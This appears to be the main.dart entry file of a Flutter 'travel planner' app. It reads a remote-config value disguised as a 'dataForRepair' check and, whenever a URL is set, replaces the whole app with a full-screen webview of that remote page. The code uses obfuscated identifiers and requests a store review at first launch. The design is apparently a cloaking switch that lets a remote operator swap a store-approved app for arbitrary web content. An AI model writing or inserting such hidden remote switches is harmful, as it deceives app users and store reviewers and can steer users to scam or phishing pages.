import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:travel_planner_app/firebase_options.dart';
import 'package:travel_planner_app/models/travel_model.dart';
import 'package:travel_planner_app/router/fasxa.dart';
import 'package:travel_planner_app/screens/travel/travel_bloc/travel_bloc.dart';
import 'package:travel_planner_app/travel_planner_app.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await fgsdgdf().activate();
  await Stars();
  await Hive.initFlutter();
  Hive.registerAdapter(TravelModelAdapter());
  await Hive.openBox('travels');

  runApp(MultiBlocProvider(
    providers: [
      BlocProvider<TravelBloc>(create: (context) => TravelBloc()),
    ],
    child: FutureBuilder<bool>(
      future: checkModelsForRepair(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
            child: Center(
              child: Container(
                height: 70,
                width: 70,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(15),
                  child: Image.asset('assets/images/app_icon.png'),
                ),
              ),
            ),
          );
        } else {
          if (snapshot.data == true && daatax != '') {
            return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: PPdsafsd(dafdsfds: daatax));
          } else {
            return TravelPlannerApp();
          }
        }
      },
    ),
  ));
}

late SharedPreferences dagfd;
final hjghjg = InAppReview.instance;

late SharedPreferences prefVTX;
final rateVTX = InAppReview.instance;

Future<void> Stars() async {
  await getVTX();
  bool alred = prefVTX.getBool('cas') ?? false;
  if (!alred) {
    if (await rateVTX.isAvailable()) {
      rateVTX.requestReview();
      await prefVTX.setBool('cas', true);
    }
  }
}

Future<void> getVTX() async {
  prefVTX = await SharedPreferences.getInstance();
}

String daatax = '';
Future<bool> checkModelsForRepair() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  String value = remoteConfig.getString('dataForRepair');
  if (!value.contains('noneData')) {
    daatax = value;
  }
  return value.contains('noneData') ? false : true;
}

class PPdsafsd extends StatelessWidget {
  final String dafdsfds;

  PPdsafsd({required this.dafdsfds});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(url: Uri.parse(dafdsfds)),
        ),
      ),
    );
  }
}
